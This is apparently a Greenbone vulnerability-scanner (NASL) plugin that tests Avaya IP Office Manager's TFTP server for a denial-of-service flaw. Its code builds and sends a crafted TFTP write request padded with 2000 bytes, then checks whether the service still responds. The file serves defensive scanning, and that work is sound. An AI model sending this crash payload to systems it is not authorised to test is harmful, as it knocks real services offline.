# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802011");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("Avaya IP Office Manager TFTP Denial of Service Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43819");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47021");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17045/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");
  script_require_keys("Host/runs_unixoide");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_tag(name:"impact", value:"Successful exploitation will allow unauthenticated attackers to
  cause the application to crash.");

  script_tag(name:"affected", value:"Avaya Ip Office Manager 8.1, Other versions may also be
  affected.");

  script_tag(name:"insight", value:"The flaw is due to an error while handling certain crafted TFTP
  write requests, which can be exploited by remote unauthenticated attackers to crash an affected application.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Avaya IP Office Manager TFTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

if(TARGET_IS_IPV6())
  exit(0);

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

## Access bin.cfg file and check it's contents
## to confirm it's Avaya TFTP
res = tftp_get(port:port, path:"bin.cfg");
if(isnull(res) && "avaya" >!< res)
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

# nb: crafted write request
crash = crap(data:"A", length:2000);
req = raw_string( 0x00, 0x02 ) + ## Write Request Opcode
      "A" + raw_string( 0x00) +  ## Destination file name
      crash + raw_string( 0x00); ## Crafted "type"

send(socket:soc, data:req);
info = recv(socket:soc, length:1024);

res = tftp_get(port:port, path:"bin.cfg");
if(isnull(res) && "avaya" >!< res) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
